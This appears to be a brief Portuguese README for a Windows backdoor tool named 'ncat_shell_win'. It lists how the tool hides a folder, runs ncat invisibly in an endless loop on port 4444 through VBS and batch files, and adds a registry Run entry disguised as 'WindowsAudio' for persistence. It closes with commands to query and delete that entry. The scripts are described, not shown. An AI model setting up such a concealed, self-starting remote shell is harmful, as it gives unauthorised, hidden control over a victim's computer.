# ncat_shell_win
Ganhar acesso ao CMD do Windows via NCAT

Cria pasta oculta	C:\Users\Joao\WindowsAudio (atributo +h)
Cria audio.vbs	Loop infinito com ncat invisível na porta 4444
Cria audio.bat	Executa o .vbs e fecha
Registro	Inicia junto com Windows como "WindowsAudio"
Já sobe o listener na hora

#Para confirmar que ficou só o Registro:
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio"

#Para remover do Registro:
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio" /f
